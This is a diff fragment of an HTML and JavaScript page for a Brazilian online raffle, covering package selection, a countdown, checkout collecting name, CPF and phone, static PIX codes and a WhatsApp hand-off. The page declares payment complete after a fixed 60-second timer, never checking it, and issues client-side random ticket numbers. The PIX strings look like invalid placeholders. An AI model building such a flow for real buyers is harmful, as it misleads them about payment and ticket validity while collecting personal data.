+                <button onclick="sendToWhatsApp()" class="w-full py-3 px-4 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs uppercase rounded-xl transition shadow-lg flex items-center justify-center gap-2">
+                    <i data-lucide="send" class="w-4 h-4"></i>
+                    Enviar no WhatsApp Oficial
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts da Aplicação -->
+    <script>
+        // =========================================================================
+        // CONFIGURAÇÕES DO ORGANIZADOR DA RIFA (EDITE AQUI SUAS CHAVES E WHATSAPP)
+        // =========================================================================
+        
+        // Número do WhatsApp que receberá os comprovantes (com DDD e Código do País 55)
+        const WHATSAPP_SUPORTE = "5511999999999"; 
+
+        // Chaves PIX Copia e Cola Estáticas Fixas para cada pacote de valor
+        const CHAVES_PIX_FIXAS = {
+            10: "00020126580014BR.GOV.BCB.PIX0136poderosa-10cotas-chave-estatica-fixa52040000530398654055.005802BR5925PODEROSA PREMIADA RIFA6009SAO PAULO62070503***6304E2CA",
+            20: "00020126580014BR.GOV.BCB.PIX0136poderosa-20cotas-chave-estatica-fixa520400005303986540510.005802BR5925PODEROSA PREMIADA RIFA6009SAO PAULO62070503***6304E2CB",
+            50: "00020126580014BR.GOV.BCB.PIX0136poderosa-50cotas-chave-estatica-fixa520400005303986540525.005802BR5925PODEROSA PREMIADA RIFA6009SAO PAULO62070503***6304E2CC",
+            100: "00020126580014BR.GOV.BCB.PIX0136poderosa-100cotas-chave-estatica-fixa520400005303986540550.005802BR5925PODEROSA PREMIADA RIFA6009SAO PAULO62070503***6304E2CD"
+        };
+
+        // =========================================================================
+
+        // Inicializar Ícones Lucide
+        lucide.createIcons();
+
+        // Configuração de Preço e Estado Atual
+        const COTA_PRICE = 0.50;
+        let selectedQty = 50;
+        let currentOrderData = {};
+        let processTimerInterval = null;
+
+        // Elementos da DOM
+        const totalPriceEl = document.getElementById('total-price');
+        const selectedQtyDisplay = document.getElementById('selected-qty-display');
+        const btnBuyText = document.getElementById('btn-buy-text');
+        const mainPrizeImg = document.getElementById('main-prize-img');
+
+        // Alterar Foto da Galeria
+        function changePhoto(src) {
+            mainPrizeImg.src = src;
+        }
+
+        // Seleção Rápida de Pacotes (Apenas 10, 20, 50, 100)
+        function selectPack(qty, element) {
+            selectedQty = qty;
+
+            // Remove destaque de todos os botões
+            const buttons = document.querySelectorAll('#pack-buttons-container .pack-btn');
+            buttons.forEach(btn => {
+                btn.classList.remove('bg-pink-950/60', 'border-2', 'border-pink-500', 'active-pack');
+                btn.classList.add('bg-[#140B15]', 'border-pink-900/30');
+                const label = btn.querySelector('span:first-child');
+                if (label && !label.classList.contains('absolute')) {
+                    label.classList.remove('text-pink-300');
+                    label.classList.add('text-zinc-400');
+                }
+            });
+
+            // Aplica destaque ao botão clicado
+            if (element) {
+                element.classList.remove('bg-[#140B15]', 'border-pink-900/30');
+                element.classList.add('bg-pink-950/60', 'border-2', 'border-pink-500', 'active-pack');
+                const label = element.querySelector('span:first-child');
+                if (label && !label.classList.contains('absolute')) {
+                    label.classList.remove('text-zinc-400');
+                    label.classList.add('text-pink-300');
+                }
+            }
+
+            updateTotal();
+        }
+
+        // Atualizar Valor Total e Exibição
+        function updateTotal() {
+            const total = selectedQty * COTA_PRICE;
+            const formattedTotal = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+            
+            selectedQtyDisplay.textContent = `${selectedQty} Cota${selectedQty > 1 ? 's' : ''}`;
+            totalPriceEl.textContent = formattedTotal;
+            btnBuyText.textContent = `Garantir ${selectedQty} Cota${selectedQty > 1 ? 's' : ''} Agora`;
+        }
+
+        // Cronômetro Regressivo para 29/12/2026 às 20:00
+        const targetDate = new Date('2026-12-29T20:00:00').getTime();
+
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const difference = targetDate - now;
+
+            if (difference > 0) {
+                const days = Math.floor(difference / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+
+                document.getElementById('timer-days').textContent = String(days).padStart(2, '0');
+                document.getElementById('timer-hours').textContent = String(hours).padStart(2, '0');
+                document.getElementById('timer-minutes').textContent = String(minutes).padStart(2, '0');
+                document.getElementById('timer-seconds').textContent = String(seconds).padStart(2, '0');
+            } else {
+                document.getElementById('timer-days').textContent = '00';
+                document.getElementById('timer-hours').textContent = '00';
+                document.getElementById('timer-minutes').textContent = '00';
+                document.getElementById('timer-seconds').textContent = '00';
+            }
+        }
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        // Modais Control
+        function openCheckoutModal() {
+            const total = selectedQty * COTA_PRICE;
+            const formattedTotal = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+            document.getElementById('modal-cota-count').textContent = `${selectedQty} cota${selectedQty > 1 ? 's' : ''}`;
+            document.getElementById('modal-cota-price').textContent = formattedTotal;
+
+            document.getElementById('modal-checkout').classList.remove('hidden');
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).classList.add('hidden');
+            if (id === 'modal-pix' && processTimerInterval) {
+                clearInterval(processTimerInterval);
+            }
+        }
+
+        // Máscaras de Entrada
+        function maskCPF(i) {
+            let v = i.value.replace(/\D/g, "");
+            v = v.replace(/(\d{3})(\d)/, "$1.$2");
+            v = v.replace(/(\d{3})(\d)/, "$1.$2");
+            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            i.value = v;
+        }
+
+        function maskPhone(i) {
+            let v = i.value.replace(/\D/g, "");
+            v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
+            v = v.replace(/(\d)(\d{4})$/, "$1-$2");
+            i.value = v;
+        }
+
+        // Gera números aleatórios de 5 dígitos para o sorteio da Loteria Federal
+        function generateRaffleNumbers(count) {
+            const numbers = new Set();
+            while (numbers.size < count) {
+                const num = Math.floor(Math.random() * 100000);
+                numbers.add(String(num).padStart(5, '0'));
+            }
+            return Array.from(numbers);
+        }
+
+        // Submissão do Formulário de Checkout
+        function handleCheckout(e) {
+            e.preventDefault();
+            
+            const name = document.getElementById('buyer-name').value;
+            const cpf = document.getElementById('buyer-cpf').value;
+            const phone = document.getElementById('buyer-phone').value;
+
+            const total = selectedQty * COTA_PRICE;
+            const formattedTotal = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+            const orderId = '#ORD-' + Math.floor(10000 + Math.random() * 90000);
+            const numbers = generateRaffleNumbers(selectedQty);
+
+            // Armazena dados do pedido atual
+            currentOrderData = {
+                orderId,
+                name,
+                cpf,
+                phone,
+                qty: selectedQty,
+                total: formattedTotal,
+                date: new Date().toLocaleString('pt-BR'),
+                numbers
+            };
+
+            // Atualiza resumo do PIX
+            document.getElementById('pix-total-val').textContent = formattedTotal;
+
+            // Busca a chave PIX estática correspondente às cotas selecionadas
+            const pixCode = CHAVES_PIX_FIXAS[selectedQty] || CHAVES_PIX_FIXAS[50];
+            document.getElementById('pix-code-input').value = pixCode;
+
+            // Gera QR Code Dinâmico via API QRServer
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
+            document.getElementById('pix-qrcode').src = qrUrl;
+
+            // Transição de Modais
+            closeModal('modal-checkout');
+            document.getElementById('modal-pix').classList.remove('hidden');
+
+            // Iniciar Timer do Processamento PIX (60 segundos)
+            startProcessTimer(60);
+        }
+
+        // Timer de Processamento PIX de 60 segundos
+        function startProcessTimer(secondsTotal) {
+            let timeLeft = secondsTotal;
+            const display = document.getElementById('process-timer');
+            const progressBar = document.getElementById('process-bar');
+
+            if (processTimerInterval) clearInterval(processTimerInterval);
+
+            processTimerInterval = setInterval(() => {
+                timeLeft--;
+                display.textContent = `${timeLeft}s`;
+                
+                const percentage = ((secondsTotal - timeLeft) / secondsTotal) * 100;
+                progressBar.style.width = `${percentage}%`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(processTimerInterval);
+                    finishPaymentAndGeneratePDF();
+                }
+            }, 1000);
+        }
+
+        // Finaliza processo após os 60 segundos e exibe modal do PDF
+        function finishPaymentAndGeneratePDF() {
+            closeModal('modal-pix');
+            
+            // Popula os dados do template do PDF
+            document.getElementById('pdf-ticket-id').textContent = currentOrderData.orderId;
+            document.getElementById('pdf-buyer-name').textContent = currentOrderData.name;
+            document.getElementById('pdf-buyer-cpf').textContent = currentOrderData.cpf;
+            document.getElementById('pdf-buyer-phone').textContent = currentOrderData.phone;
+            document.getElementById('pdf-buy-date').textContent = currentOrderData.date;
+            document.getElementById('pdf-cota-summary').textContent = `${currentOrderData.qty} Cotas (${currentOrderData.total})`;
+
+            // Popula grid com os números da sorte
+            const numbersGrid = document.getElementById('pdf-numbers-grid');
+            numbersGrid.innerHTML = '';
+            currentOrderData.numbers.forEach(num => {
+                const numBox = document.createElement('div');
+                numBox.className = 'bg-pink-950/60 border border-pink-500/30 rounded py-1 text-center font-mono text-xs font-bold text-pink-300';
+                numBox.textContent = num;
+                numbersGrid.appendChild(numBox);
+            });
+
+            document.getElementById('modal-pdf').classList.remove('hidden');
+            
+            // Baixa o PDF automaticamente
+            setTimeout(downloadPDF, 800);
+        }
+
+        // Download do PDF com jsPDF + html2canvas
+        function downloadPDF() {
+            const element = document.getElementById('pdf-ticket-container');
+            const { jsPDF } = window.jspdf;
+
+            html2canvas(element, {
+                scale: 2,
+                backgroundColor: '#140B15'
+            }).then(canvas => {
+                const imgData = canvas.toDataURL('image/png');
+                const pdf = new jsPDF('p', 'mm', 'a4');
+                const imgWidth = 190;
+                const pageHeight = 295;
+                const imgHeight = (canvas.height * imgWidth) / canvas.width;
+                
+                pdf.addImage(imgData, 'PNG', 10, 15, imgWidth, imgHeight);
+                pdf.save(`Poderosa_Premiada_Cotas_${currentOrderData.orderId || 'Sorteio'}.pdf`);
+            });
+        }
+
+        // Enviar Dados e Pedido pro WhatsApp do Organizador
+        function sendToWhatsApp() {
+            const message = `🌸 *PODEROSA PREMIADA - COMPROVANTE DE COTAS*\n\n` +
+                `*Pedido:* ${currentOrderData.orderId}\n` +
+                `*Nome:* ${currentOrderData.name}\n` +
+                `*CPF:* ${currentOrderData.cpf}\n` +
+                `*Celular:* ${currentOrderData.phone}\n` +
+                `*Quantidade:* ${currentOrderData.qty} Cotas\n` +
+                `*Valor Total:* ${currentOrderData.total}\n\n` +
+                `📌 *Estou enviando em anexo meu comprovante de pagamento PIX e meu PDF de cotas gerado pelo sistema.*`;
+
+            const encodedMessage = encodeURIComponent(message);
+            const whatsappUrl = `https://api.whatsapp.com/send?phone=${WHATSAPP_SUPORTE}&text=${encodedMessage}`;
+            window.open(whatsappUrl, '_blank');
+        }
+
+        // Copiar Código PIX Copia e Cola
+        function copyPixCode() {
+            const pixInput = document.getElementById('pix-code-input');
+            pixInput.select();
+            pixInput.setSelectionRange(0, 99999);
+
+            try {
+                document.execCommand('copy');
+                const btnText = document.getElementById('copy-btn-text');
+                btnText.textContent = "Copiado!";
+                setTimeout(() => {
+                    btnText.textContent = "Copiar";
+                }, 2000);
+            } catch (err) {
+                console.error("Erro ao copiar: ", err);
+            }
+        }
+    </script>
+</body>
+</html>
